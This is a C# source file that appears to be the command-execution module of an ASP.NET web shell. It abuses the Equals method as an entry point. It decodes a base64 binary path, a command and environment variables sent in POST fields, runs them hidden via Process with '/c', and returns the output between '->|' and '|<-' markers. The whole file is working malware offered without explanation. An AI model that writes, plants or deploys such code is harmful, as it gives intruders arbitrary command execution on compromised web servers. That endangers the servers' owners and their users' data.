using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;

public class Exec
{
    public HttpRequest Request;
    public HttpResponse Response;
    public String encoder;
    public String decoder;
    public String cs;
    public String randomPrefix;

    public override bool Equals(object obj)
    {
        Page page = (Page) obj;
        this.Response = page.Response;
        this.Request = page.Request;
        this.cs = "UTF-8";
        this.encoder = "base64";
        this.decoder = "";
        this.randomPrefix = "2";
        String tag_s = "->|";
        String tag_e = "|<-";
        this.Response.Charset = cs;
        String result = "";
        try
        {
            String bin = decode(this.Request.Form["bin"]);
            String cmd = decode(this.Request.Form["cmd"]);
            String env = decode(this.Request.Form["env"]);
            result += this.ExecuteCmd(bin, cmd, env);
        }
        catch (Exception e)
        {
            result = "ERROR:// " + e.Message;
        }

        this.Response.Write(tag_s + asoutput(result) + tag_e);
        return true;
    }


    public string ExecuteCmd(String bin, String cmd, String env)
    {
        String ret = "";

        ProcessStartInfo c = new ProcessStartInfo(bin);
        Process e = new Process();
        StreamReader OT, ER;
        c.UseShellExecute = false;
        c.RedirectStandardInput = true;
        c.RedirectStandardOutput = true;
        c.RedirectStandardError = true;
        c.CreateNoWindow = true;
        e.StartInfo = c;
        c.Arguments = "/c " + cmd;
        if (env != "")
        {
            String[] envarr = Regex.Split(env, "\\|\\|\\|asline\\|\\|\\|");
            int i;
            for (i = 0; i < envarr.Length; i++)
            {
                String[] ss = Regex.Split(envarr[i], "\\|\\|\\|askey\\|\\|\\|");
                if (ss.Length != 2)
                {
                    continue;
                }

                c.EnvironmentVariables.Add(ss[0], ss[1]);
            }
        }

        e.Start();
        OT = e.StandardOutput;
        ER = e.StandardError;
        e.Close();
        ret = OT.ReadToEnd() + ER.ReadToEnd();

        return ret;
    }


    public String HexAsciiConvert(String hex)
    {
        StringBuilder sb = new StringBuilder();
        int i;
        for (i = 0; i < hex.Length; i += 2)
        {
            sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2),
                System.Globalization.NumberStyles.HexNumber))));
        }

        return sb.ToString();
    }

    public String decode(String src)
    {
        int prefixlen = 0;
        try
        {
            prefixlen = Int32.Parse(randomPrefix);
            src = src.Substring(prefixlen);
        }
        catch (Exception e)
        {
        }

        String ret;
        try
        {
            switch (encoder)
            {
                case "base64":
                {
                    ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                    break;
                }
                case "hex":
                {
                    ret = HexAsciiConvert(src);
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }

    public String asoutput(String src)
    {
        String ret;
        try
        {
            switch (decoder)
            {
                case "base64":
                {
                    ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                    break;
                }
                default:
                {
                    ret = src;
                    break;
                }
            }
        }
        catch (Exception e)
        {
            ret = e.Message.ToString();
        }

        return ret;
    }
}